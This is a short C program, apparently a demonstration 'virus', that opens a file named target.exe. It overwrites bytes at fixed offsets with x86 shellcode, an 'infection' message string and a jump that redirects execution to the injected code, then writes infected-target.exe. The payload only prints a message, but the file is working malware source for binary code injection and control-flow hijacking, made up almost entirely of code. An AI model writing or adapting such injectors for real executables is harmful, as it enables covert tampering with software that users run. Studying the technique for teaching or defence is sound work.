#include <stdio.h>
#include <stdlib.h>

// The default start address for a 32 bit elf executable
#define BASE_ADDR 0x08048000
// Offsets for code injection
#define LARGE_OFFSET 1102									// Malicious code goes here
#define STRING_OFFSET_ABS 1118								// Address in file where the string needs to go
#define STRING_OFFSET_REL (STRING_OFFSET_ABS + BASE_ADDR)	// Relative address of the injected string
#define SMALL_OFFSET 1170									// Jump to malicious code goes here

// The string to print when the program is infected
char *string = "Wahoo virus infection!";
// The instructions to jump to the malicious code
char *jmpcode = "\xe9\xb7\xff\xff\xff";
// The actual malicious code
char *maincode = "\x68\x5e\x84\x04\x08\xe8\x88\xfe\xff\xff\xc9\xc3";

int main(void) {
	FILE *original, *patched;
	char *buffer;
	int size;
	original = fopen("target.exe", "rb");
	// Get the size of the file
	fseek(original, 0, SEEK_END);
	size = ftell(original);
	// Reset to the beginning of the file
	fseek(original, 0, SEEK_SET);
	// Allocate memory for the file contents
	buffer = malloc(size);
	// Read the file contents into the buffer
	fread(buffer, 1, size, original);
	// Close the file
	fclose(original);

	printf("Patching file...");

	// Patch the file
	// Inject the malicious code
	for (int i = LARGE_OFFSET; i < (LARGE_OFFSET + 12); i++) {
		buffer[i] = maincode[i - LARGE_OFFSET];
	}
	// Inject the string
	for (int i = STRING_OFFSET_ABS; i < (STRING_OFFSET_ABS + 23); i++) {
		buffer[i] = string[i - STRING_OFFSET_ABS];
	}
	// Inject the jump to the malicious code
	for (int i = SMALL_OFFSET; i < (SMALL_OFFSET + 5); i++) {
		buffer[i] = jmpcode[i - SMALL_OFFSET];
	}

	// Open the file infected-target.exe for writing
	patched = fopen("infected-target.exe", "wb");
	// Write the contents of the buffer to the output file
	fwrite(buffer, 1, size, patched);
	// Close the output file
	fclose(patched);

	// Free memory allocated for the buffer
	free(buffer);

	printf("done!\r\n");

	return 0;
}